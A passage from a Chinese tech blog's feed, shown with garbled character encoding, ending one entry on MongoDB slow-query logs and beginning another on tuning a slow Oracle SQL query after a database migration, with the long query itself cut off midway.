&lt;li&gt;æŸå¤©æ™šä¸Šåˆšåˆ°å®¶ä¸ä¹…ï¼Œå°±æ¥åˆ°æ­å·åŒäº‹çš„ç”µè¯ï¼Œå®¢æˆ·MongoDBé›†ç¾¤ä¸­çš„æŸä¸ªåˆ†ç‰‡èŠ‚ç‚¹CPUé£™é«˜ï¼Œåˆæ­¥åˆ¤æ–­æ˜¯æ…¢æŸ¥è¯¢ï¼Œç°åœ¨éœ€è¦æ‹‰å–CPUé£™é«˜æ—¶é—´æ®µçš„æ…¢æŸ¥è¯¢ã€‚å¿ƒæƒ³æ‹‰å–æ…¢æŸ¥è¯¢åº”è¯¥å¾ˆå¿«ï¼Œä¸å°±æ˜¯ä¸ªç³»ç»Ÿæ—¥å¿—å—ï¼Ÿè€Œä¸”è¿˜åšäº†æ—¥å¿—åˆ‡å‰²ä¸€å¤©ä¸€ä¸ªï¼ŒæŒ‰é“ç†å¾ˆå¿«æå®šçš„ï¼Œè°çŸ¥å½“å¤©æ™šä¸Šæäº†æ¥è¿‘ä¸‰ä¸ªå°æ—¶ä¹Ÿæ²¡æå®šã€‚ç©¶ç«Ÿå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ&lt;/li&gt;
&lt;li&gt;è¿›å…¥åˆ°æ—¥å¿—ç›®å½•ä¸€çœ‹ï¼Œç›®å‰ä¿ç•™è¿‘7å¤©çš„æ—¥å¿—ï¼Œæ¯å¤©çš„æ—¥å¿—é‡åœ¨23G~24Gï¼Œæˆ‘å½“æ—¶å°±æƒ³è¿™ä¸ªå®¢æˆ·æ•°æ®é‡è¿™ä¹ˆå¤§ï¼åç»­å‘ç°æ—¥å¿—æ ¼å¼æœ¬è¯¥ä¸ºæ™®é€šæ–‡æœ¬æ–‡ä»¶ç¡®å˜æˆäº†å›¾ç‰‡æ ¼å¼ï¼Œç©¶ç«Ÿä¸ºä½•ä¼šæ–‡ä»¶æ ¼å¼ä¼šè½¬å˜ï¼Ÿèƒ½å¦ä»å›¾ç‰‡æ ¼å¼ä¸­æ‹‰å–æŒ‡å®šæ—¶é—´æ®µçš„æ—¥å¿—å‘¢ï¼Ÿ&lt;/li&gt;
&lt;li&gt;ç¬¬äºŒå¤©åˆ°å…¬å¸ï¼Œç”±äºå®¢æˆ·ç¯å¢ƒæˆ‘ä»¬ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ¥æ‰‹ï¼Œå› æ­¤å’±ä»¬æŠ€æœ¯ä¸“å®¶å›¢é˜Ÿæäº†ä¸€ä¸ª3äººçš„â€ä¸“å®¶ä¼šè¯Šâ€ï¼Œç»è¿‡äº†ä¸€ç•ªæŠ˜è…¾æ€»ç®—æŠŠåŸå› æ‰¾åˆ°äº†ï¼Œå…·ä½“è¿‡ç¨‹è¯·çœ‹ä¸‹æ–‡ï¼&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="æŠ€æœ¯å¹¿è§’" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/"/>
    
      <category term="MongoDB" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/MongoDB/"/>
    
    
      <category term="æ•°æ®æ•‘æ´" scheme="http://www.toberoot.com/tags/%E6%95%B0%E6%8D%AE%E6%95%91%E6%8F%B4/"/>
    
  </entry>
  
  <entry>
    <title>Oracleæ•°æ®åº“SQLä¼˜åŒ–_ç´¢å¼•ç¼ºå¤±</title>
    <link href="http://www.toberoot.com/2018/05/29/booboo_others/oracle%E6%95%B0%E6%8D%AE%E5%BA%93SQL%E4%BC%98%E5%8C%96-%E7%B4%A2%E5%BC%95%E7%BC%BA%E5%A4%B1/"/>
    <id>http://www.toberoot.com/2018/05/29/booboo_others/oracle%E6%95%B0%E6%8D%AE%E5%BA%93SQL%E4%BC%98%E5%8C%96-%E7%B4%A2%E5%BC%95%E7%BC%BA%E5%A4%B1/</id>
    <published>2018-05-28T18:09:32.000Z</published>
    <updated>2020-03-22T08:32:42.573Z</updated>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šOracleæ•°æ®åº“åšäº†è¿ç§»ï¼Œä»åŸæ¥çš„DGè¿ç§»åˆ°æ–°åº“RACï¼Œå°ç‰ˆæœ¬ä¸åŒï¼›è€åº“ä¸­ç›¸åŒçš„SQLæ‰§è¡Œåªéœ€è¦11ç§’ï¼Œè€Œæ–°åº“éœ€è¦360ç§’ç”šè‡³800å¤šç§’ï¼Œå¦‚ä½•è¿›è¡Œå¤æ‚æŸ¥è¯¢çš„SQLä¼˜åŒ–ï¼Œæœ¬æ–‡æä¾›é€šç”¨çš„ä¸€ä¸ªæ€è·¯ã€‚</p><a id="more"></a><h2 id="é—®é¢˜æè¿°"><a href="#é—®é¢˜æè¿°" class="headerlink" title="é—®é¢˜æè¿°"></a>é—®é¢˜æè¿°</h2><p>oracleæ•°æ®åº“åšäº†è¿ç§»ï¼Œä»åŸæ¥çš„DGè¿ç§»åˆ°æ–°åº“RACï¼Œå°ç‰ˆæœ¬ä¸åŒï¼›</p><p>è€åº“ä¸­ç›¸åŒçš„SQLæ‰§è¡Œåªéœ€è¦11ç§’ï¼Œè€Œæ–°åº“éœ€è¦360ç§’ç”šè‡³800å¤šç§’ã€‚</p><table><thead><tr><th>åº“</th><th>åŸæŸ¥è¯¢æ—¶é—´</th><th>ä¼˜åŒ–åçš„æŸ¥è¯¢æ—¶é—´</th></tr></thead><tbody><tr><td>è€åº“</td><td>11ç§’</td><td>1.4ç§’ ç¼“å­˜å 0.4ç§’</td></tr><tr><td>æ–°åº“RAC</td><td>360ç§’</td><td>1.4ç§’ ç¼“å­˜å0.4ç§’æ’æŸ¥æ€è·¯</td></tr></tbody></table><h2 id="å¾…ä¼˜åŒ–SQL"><a href="#å¾…ä¼˜åŒ–SQL" class="headerlink" title="å¾…ä¼˜åŒ–SQL"></a>å¾…ä¼˜åŒ–SQL</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line">prj.PROVINCE_AD_NAME,</span><br><span class="line">prj.CITY_AD_NAME,</span><br><span class="line">prj.AD_NAME,</span><br><span class="line">prj.CHANNEL_SYS_CAT,</span><br><span class="line">prj.EXCUTE_EL,</span><br><span class="line">prj.PRJ_CODE AS PRJ_CODE,</span><br><span class="line">prj.PRJ_NAME AS PRJ_NAME,</span><br><span class="line">prj.POS_CODE AS POS_CODE,</span><br><span class="line">prj.POS_NAME AS POS_NAME,</span><br><span class="line">prj.CUST_CHANNEL_CODE,</span><br><span class="line">prj.CUST_CHANNEL_NAME,</span><br><span class="line">prj.EMP_CODE AS EMP_CODE,</span><br><span class="line">prj.NAME AS EMP_NAME,</span><br><span class="line">prj.ATT_DATE AS APPLY_DATE,</span><br><span class="line">prj.EMP_PK AS EMP_PK,</span><br><span class="line">prj.ATT_START_TIME AS START_TIME,</span><br><span class="line">prj.ATT_END_TIME AS END_TIME,</span><br><span class="line">prj.ATT_ISWORK AS ISWORK,</span><br><span class="line">prj.ATT_UNWORK AS ATTTYPE,</span><br><span class="line">prj.START_XPOS AS ON_WORK_POSITION_LON,</span><br><span class="line">prj.START_YPOS AS ON_WORK_POSITION_LAT,</span><br><span class="line">prj.START_ISEXCEP AS ON_WORK_POSITION_STAUS,</span><br><span class="line">prj.END_XPOS AS OFF_WORK_POSITION_LAT,</span><br><span class="line">prj.END_YPOS AS OFF_WORK_POSITION_LON,</span><br><span class="line">prj.END_ISEXCEP AS OFF_WORK_POSITION_STAUS,</span><br><span class="line">ifcl1Staus.COMPARE_TYPE AS FACE_ATT_TYPE,</span><br><span class="line">ifcl1.STATUS AS FACE_ATT_STATUS,</span><br><span class="line">NVL( ifaceCount.faceCount, 0 ) AS FACE_ATT_COUNT,</span><br><span class="line">NVL( levLeave.LEAVECount, 0 ) AS LEAVE_WORK_COUNT,</span><br><span class="line">NVL( levRtn.RETURNCount, 0 ) AS RETURN_WORK_COUNT,</span><br><span class="line">wq.STATUS AS PRJ_QUESTION_TYPE,</span><br><span class="line">iface2.FACE_ATT_IMG AS FACE_ATT_IMG,</span><br><span class="line">prj.SA_TYPE</span><br><span class="line">FROM</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">dpsi.ID AS ID,</span><br><span class="line">P.ID AS PRJ_ID,</span><br><span class="line">mad.AD_CODE,</span><br><span class="line">mad.PROVINCE_AD_NAME,</span><br><span class="line">mad.CITY_AD_NAME,</span><br><span class="line">mad.AD_NAME,</span><br><span class="line">mpk.POS_KIND_CODE,</span><br><span class="line">mpk.POS_KIND_NAME,</span><br><span class="line">P.CODE AS PRJ_CODE,</span><br><span class="line">P.NAME AS PRJ_NAME,</span><br><span class="line">P.START_DATE,</span><br><span class="line">p.END_DATE,</span><br><span class="line">dpsi.CUST_CHANNEL,</span><br><span class="line">dpsi.CUST_SYS,</span><br><span class="line">dpsi.CUST_CHANNEL_CODE,</span><br><span class="line">dpsi.CUST_CHANNEL_NAME,</span><br><span class="line">dcs.CHANNEL_SYS_CAT,</span><br><span class="line">dcs.CHANNEL_CAT_CODE,</span><br><span class="line">dcs.CHANNEL_AD_CODE,</span><br><span class="line">dcs.CHANNEL_PROVINCE_AD_CODE,</span><br><span class="line">dcs.CHANNEL_CITY_AD_CODE,</span><br><span class="line">dcs.ID AS POS_ID,</span><br><span class="line">dcs.CHANNEL_CODE AS POS_CODE,</span><br><span class="line">dcs.CHANNEL_NAME AS POS_NAME,</span><br><span class="line">dcs.LONGITUDE AS LONGITUDE,</span><br><span class="line">dcs.LATITUDE AS LATITUDE,</span><br><span class="line">dss.id AS SALES_ID,</span><br><span class="line">TO_CHAR( cal.sc_schedule_date, 'yyyy-mm-dd' ) AS sc_schedule_date,</span><br><span class="line">wor.SW_BEGIN_TIME AS SALES_WORK_START,</span><br><span class="line">wor.SW_END_TIME AS SALES_WORK_END,</span><br><span class="line">dss.SALES_EAT_START,</span><br><span class="line">dss.SALES_EAT_END,</span><br><span class="line">memp.EMP_PK,</span><br><span class="line">memp.EMP_CODE,</span><br><span class="line">dss.SALES_NAME AS NAME,</span><br><span class="line">dss.SALES_PHONE AS TEL,</span><br><span class="line">dss.SALES_CARD_ID AS ID_CARD,</span><br><span class="line">spp.PRJ_ATT_CHECK_TYPE,</span><br><span class="line">spp.ALLOW_LEAVE_TIME,</span><br><span class="line">e1.EMP_CODE AS EXCUTE_CODE,</span><br><span class="line">e1.emp_name AS EXCUTE_EL,</span><br><span class="line">e2.EMP_CODE AS CITY_CODE,</span><br><span class="line">e2.emp_name AS CITY_EL,</span><br><span class="line">e3.EMP_CODE AS AREA_CODE,</span><br><span class="line">e3.EMP_NAME AS AREA_NAME,</span><br><span class="line">dpsi.SCHEDULE_TYPE,</span><br><span class="line">sac.ATT_START_TIME,</span><br><span class="line">sac.ATT_END_TIME,</span><br><span class="line">sac.ATT_ISWORK,</span><br><span class="line">sac.ATT_UNWORK,</span><br><span class="line">sac.START_XPOS,</span><br><span class="line">sac.START_YPOS,</span><br><span class="line">DECODE( sac.START_ISEXCEP, 0, 2201, 1, 2202, 2, 2203, 3, 2204, 4, 2205, 2206 ) AS START_ISEXCEP,</span><br><span class="line">sac.END_XPOS,</span><br><span class="line">sac.END_YPOS,</span><br><span class="line">sac.END_ISEXCEP,</span><br><span class="line">sac.ATT_SCH_PK,</span><br><span class="line">sac.ATT_DATE,</span><br><span class="line">CASE</span><br><span class="line">WHEN sac.ATT_START_TIME IS NOT NULL</span><br><span class="line">AND sac.ATT_END_TIME IS NOT NULL THEN '1'</span><br><span class="line">WHEN sac.ATT_START_TIME IS NOT NULL</span><br><span class="line">OR sac.ATT_END_TIME IS NOT NULL THEN '2'</span><br><span class="line">ELSE '2'</span><br><span class="line">END AS SA_TYPE</span><br><span class="line">FROM</span><br><span class="line">DM_PROJECT_SELLIN_INFO dpsi</span><br><span class="line">LEFT JOIN MD_EMP e1 ON</span><br><span class="line">dpsi.EMP_CODE = e1.EMP_CODE</span><br><span class="line">LEFT JOIN MD_EMP e2 ON</span><br><span class="line">dpsi.CITY_EMP_CODE = e2.EMP_CODE</span><br><span class="line">LEFT JOIN MD_EMP e3 ON</span><br><span class="line">dpsi.AREA_MANAGER_CODE = e3.EMP_CODE,</span><br><span class="line">DM_PROJECT P,</span><br><span class="line">DM_PROJECT_SELLIN_SALES dss,</span><br><span class="line">DM_CHANNEL_SYNC dcs,</span><br><span class="line">MD_EMP memp,</span><br><span class="line">SP_PRJ_PARM spp,</span><br><span class="line">Md_Admin_Div mad,</span><br><span class="line">MD_POS_KIND mpk,</span><br><span class="line">dm_sales_schedule_calendar cal,</span><br><span class="line">dm_sales_schedule_work wor,</span><br><span class="line">SP_ATT_SCH sac</span><br><span class="line">WHERE</span><br><span class="line">dpsi.PROJECT_ID = P.ID</span><br><span class="line">AND dss.id = cal.sales_id</span><br><span class="line">AND cal.schedule_work_id = wor.id</span><br><span class="line">AND dcs.CHANNEL_CAT_CODE = mpk.POS_KIND_CODE</span><br><span class="line">AND dss.PROJECT_SELLIN_INFO_ID = dpsi.ID</span><br><span class="line">AND dss.DELETE_FLAG = '0'</span><br><span class="line">AND dpsi.CHANNEL_SYNC_ID = dcs.ID</span><br><span class="line">AND LOWER( memp.EMP_S_CODE )= LOWER( dss.SALES_CARD_ID )</span><br><span class="line">AND P.IS_DELETE IS NULL</span><br><span class="line">AND memp.IS_DEL = '0'</span><br><span class="line">AND spp.PRJ_CODE = P.CODE</span><br><span class="line">AND mad.AD_ID = dcs.CHANNEL_ADMIN_DIV_ID</span><br><span class="line">AND mad.IS_DEL = '0'</span><br><span class="line">AND memp.EMP_TYPE = '1001'</span><br><span class="line">AND TO_CHAR( cal.sc_schedule_date, 'yyyy-mm-dd' )&gt;='2018-04-01'</span><br><span class="line">AND TO_CHAR( cal.sc_schedule_date, 'yyyy-mm-dd' )&lt;='2018-04-30'</span><br><span class="line">AND sac.PRJ_CODE = p.CODE</span><br><span class="line">AND sac.POS_CODE = dcs.CHANNEL_CODE</span><br><span class="line">AND sac.EMP_PK = memp.EMP_PK</span><br><span class="line">AND sac.ATT_DATE = TO_CHAR( cal.sc_schedule_date, 'yyyy-mm-dd' )</span><br><span class="line">AND TO_CHAR( sac.CRT_DATE, 'yyyy-mm-dd' )&gt;='2018-04-01'</span><br><span class="line">AND TO_CHAR( sac.CRT_DATE, 'yyyy-mm-dd' )&lt;='2018-04-30'</span><br><span class="line">) prj,</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">ifcl.EMP_PK,</span><br><span class="line">ifcl.COMPARE_DATE,</span><br><span class="line">ifcl.STATUS</span><br><span class="line">FROM</span><br><span class="line">IPG_FACE_COMPARE_LOG ifcl</span><br><span class="line">WHERE</span><br><span class="line">ifcl.HANDLE_TYPE = 0</span><br><span class="line">AND ifcl.DELETE_FLAG = '0'</span><br><span class="line">AND ifcl.COMPARE_TYPE IN(</span><br><span class="line">'1',</span><br><span class="line">'3',</span><br><span class="line">'5'</span><br><span class="line">)</span><br><span class="line">AND ifcl.COMPARE_DATE &gt;= TO_CHAR( TO_DATE('2018-04-01', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">AND ifcl.COMPARE_DATE &lt;= TO_CHAR( TO_DATE('2018-04-30', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">GROUP BY</span><br><span class="line">ifcl.EMP_PK,</span><br><span class="line">ifcl.COMPARE_DATE,</span><br><span class="line">ifcl.STATUS</span><br><span class="line">HAVING</span><br><span class="line">AVG( STATUS )&lt; 1</span><br><span class="line">) ifcl1,</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">*</span><br><span class="line">FROM</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">EMP_PK,</span><br><span class="line">COMPARE_DATE,</span><br><span class="line">COMPARE_TYPE,</span><br><span class="line">ROW_NUMBER() OVER(</span><br><span class="line">PARTITION BY EMP_PK,</span><br><span class="line">COMPARE_DATE</span><br><span class="line">ORDER BY</span><br><span class="line">CREATED DESC</span><br><span class="line">) rn</span><br><span class="line">FROM</span><br><span class="line">IPG_FACE_COMPARE_LOG</span><br><span class="line">WHERE</span><br><span class="line">COMPARE_DATE &gt;= TO_CHAR( TO_DATE('2018-04-01', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">AND COMPARE_DATE &lt;= TO_CHAR( TO_DATE('2018-04-30', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">AND COMPARE_TYPE IN(</span><br><span class="line">'1',</span><br><span class="line">'3',</span><br><span class="line">'5'</span><br><span class="line">)</span><br><span class="line">) t</span><br><span class="line">WHERE</span><br><span class="line">t.rn &lt;= 1</span><br><span class="line">) ifcl1Staus,</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">SP_LEV_RPT.ATT_SCH_PK,</span><br><span class="line">COUNT(*) AS LEAVECount</span><br><span class="line">FROM</span><br><span class="line">SP_LEV_RPT</span><br><span class="line">WHERE</span><br><span class="line">SP_LEV_RPT.START_TIME IS NOT NULL</span><br><span class="line">GROUP BY</span><br><span class="line">SP_LEV_RPT.ATT_SCH_PK</span><br><span class="line">) levLeave,</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">SP_LEV_RPT.ATT_SCH_PK,</span><br><span class="line">COUNT(*) AS RETURNCount</span><br><span class="line">FROM</span><br><span class="line">SP_LEV_RPT</span><br><span class="line">WHERE</span><br><span class="line">SP_LEV_RPT.END_TIME IS NOT NULL</span><br><span class="line">GROUP BY</span><br><span class="line">SP_LEV_RPT.ATT_SCH_PK</span><br><span class="line">) levRtn,</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">WX_QUESTION.PRJ_ID,</span><br><span class="line">DM_PROJECT.CODE,</span><br><span class="line">'Y' AS STATUS</span><br><span class="line">FROM</span><br><span class="line">WX_QUESTION,</span><br><span class="line">DM_PROJECT</span><br><span class="line">WHERE</span><br><span class="line">DM_PROJECT.ID = WX_QUESTION.PRJ_ID</span><br><span class="line">AND WX_QUESTION.IS_DEL = '0'</span><br><span class="line">AND WX_QUESTION.STATUS = '0'</span><br><span class="line">GROUP BY</span><br><span class="line">WX_QUESTION.PRJ_ID,</span><br><span class="line">DM_PROJECT.CODE</span><br><span class="line">) wq,</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">ifcl.EMP_PK,</span><br><span class="line">ifcl.COMPARE_DATE,</span><br><span class="line">COUNT(*) AS faceCount</span><br><span class="line">FROM</span><br><span class="line">IPG_FACE_COMPARE_LOG ifcl</span><br><span class="line">WHERE</span><br><span class="line">ifcl.HANDLE_TYPE = 0</span><br><span class="line">AND ifcl.COMPARE_TYPE IN(</span><br><span class="line">'1',</span><br><span class="line">'3',</span><br><span class="line">'5'</span><br><span class="line">)</span><br><span class="line">AND ifcl.COMPARE_DATE &gt;= TO_CHAR( TO_DATE('2018-04-01', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">AND ifcl.COMPARE_DATE &lt;= TO_CHAR( TO_DATE('2018-04-30', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">GROUP BY</span><br><span class="line">ifcl.EMP_PK,</span><br><span class="line">ifcl.COMPARE_DATE</span><br><span class="line">) ifaceCount,</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">iface.EMP_PK,</span><br><span class="line">iface.COMPARE_DATE,</span><br><span class="line">wm_concat(</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">NVL( TRIM( T.PAR_VALUE ), TRIM( T.OLD_PAR_VALUE ))</span><br><span class="line">FROM</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">PAR_VALUE</span><br><span class="line">FROM</span><br><span class="line">MD_SYS_PARM</span><br><span class="line">WHERE</span><br><span class="line">PAR_CODE = 'OLD_PIC_PATH'</span><br><span class="line">) AS OLD_PAR_VALUE,</span><br><span class="line">PAR_VALUE</span><br><span class="line">FROM</span><br><span class="line">MD_SYS_PARM</span><br><span class="line">WHERE</span><br><span class="line">PAR_CODE = 'ATT_COS_PATH'</span><br><span class="line">) T</span><br><span class="line">)|| REPLACE( SUBSTR( iface.COMPARE_MSG, INSTR( iface.COMPARE_MSG, 'compare', 1, 1 )), ']', '' )</span><br><span class="line">) AS FACE_ATT_IMG</span><br><span class="line">FROM</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">ifa.EMP_PK,</span><br><span class="line">ifa.COMPARE_DATE,</span><br><span class="line">ifa.COMPARE_MSG,</span><br><span class="line">RANK() OVER(</span><br><span class="line">PARTITION BY ifa.EMP_PK,</span><br><span class="line">ifa.COMPARE_DATE</span><br><span class="line">ORDER BY</span><br><span class="line">ifa.created DESC</span><br><span class="line">) rankno</span><br><span class="line">FROM</span><br><span class="line">IPG_FACE_COMPARE_LOG ifa</span><br><span class="line">WHERE</span><br><span class="line">ifa.HANDLE_TYPE = 0</span><br><span class="line">AND ifa.COMPARE_TYPE IN(</span><br><span class="line">'1',</span><br><span class="line">'3',</span><br><span class="line">'5'</span><br><span class="line">)</span><br><span class="line">AND INSTR( ifa.COMPARE_MSG, 'compare' )&gt; 0</span><br><span class="line">AND ifa.COMPARE_DATE &gt;= TO_CHAR( TO_DATE('2018-04-01', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">AND ifa.COMPARE_DATE &lt;= TO_CHAR( TO_DATE('2018-04-30', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">) iface</span><br><span class="line">WHERE</span><br><span class="line">iface.rankno &lt;= 3</span><br><span class="line">GROUP BY</span><br><span class="line">iface.EMP_PK,</span><br><span class="line">iface.COMPARE_DATE</span><br><span class="line">) iface2</span><br><span class="line">WHERE</span><br><span class="line">prj.PRJ_NAME ='(2013)è¡Œæ”¿é¡¹ç›®'</span><br><span class="line">AND prj.ATT_DATE &gt;='2018-04-01'</span><br><span class="line">AND prj.ATT_DATE &lt;='2018-04-30'</span><br><span class="line">AND prj.EMP_PK = ifcl1.EMP_PK(+)</span><br><span class="line">AND TO_CHAR( TO_DATE( prj.ATT_DATE, 'yyyy-mm-dd' ), 'yyyymmdd' )= ifcl1.COMPARE_DATE(+)</span><br><span class="line">AND prj.EMP_PK = ifcl1Staus.EMP_PK(+)</span><br><span class="line">AND TO_CHAR( TO_DATE( 